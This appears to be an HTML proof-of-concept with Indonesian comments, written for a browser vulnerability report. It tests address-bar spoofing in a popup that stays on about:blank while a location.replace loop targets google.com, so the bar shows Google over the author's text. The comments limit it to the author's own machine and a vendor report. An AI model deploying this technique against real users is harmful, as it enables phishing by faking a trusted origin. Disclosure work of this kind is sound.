<!-- 04 - popup about:blank + replace loop   [address-bar spoofing | macOS: Dia/Arc/Chrome/Safari macOS]
     MEKANISME : about:blank hasil window.open TIDAK punya URL sendiri, jadi bilah tak punya kebenaran untuk kembali; location.replace tanpa delay (clamp ~4ms) menahan pending.
     PREDIKAT  : bilah POPUP menulis https://www.google.com sementara isinya tulisan penyerang.
     AMAN      : popup menampilkan about:blank atau origin pembuka.
     ETIKA     : browser & mesin sendiri. Nol form, nol kredensial, nol fetch/beacon, nol resource luar.
                 "www.google.com" = label tak-berbahaya; example.com = origin uji (IANA reserved).
                 Berhenti di predikat -> screenshot -> lapor VRP. Bukan kit phishing. -->
<meta charset="utf-8"><title>04 popup about:blank + replace loop</title>
<button onclick="go()" style="font:16px system-ui;padding:12px 22px">RUN</button>
<p id="o" style="font:12px ui-monospace,monospace;color:#555"></p>
<script>
var T='https://www.google.com:9090/';o.textContent='REAL: '+location.origin;
function go(){var w=window.open('','');setInterval(function(){w.location.replace(T);});w.document.write('<h3>BUKAN google.com - ditulis '+location.origin+'</h3>');}
</script>
